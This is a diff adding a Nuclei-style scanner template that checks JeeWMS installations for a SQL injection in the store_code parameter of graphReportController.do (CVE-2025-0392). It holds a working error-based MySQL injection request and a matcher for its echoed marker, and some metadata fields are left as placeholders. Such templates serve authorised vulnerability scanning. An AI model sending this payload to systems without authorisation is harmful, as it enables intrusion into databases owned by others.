@@ -1,0 +1,34 @@
+id: jeewms-graphReportController-sqli
+info:
+  name: JeeWMS系统 store_code params - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/TZJYcWx76qtC_wmufuZ30g
+  classification:
+    cve-id: CVE-2025-0392
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: jeewms,sqli
+
+http:
+  - raw:
+      - |
+        GET /rest/../graphReportController.do?datagridGraph&configId=CWSYL&store_code=1%27+AND+GTID_SUBSET%28CONCAT%280x7178627a71%2C%28SELECT+%28ELT%284503%3D4503%2C1%29%29%29%2C0x717a6a6b71%29%2C4503%29--+wnMN HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: keep-alive
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'qxbzq1qzjkq')
+        condition: and
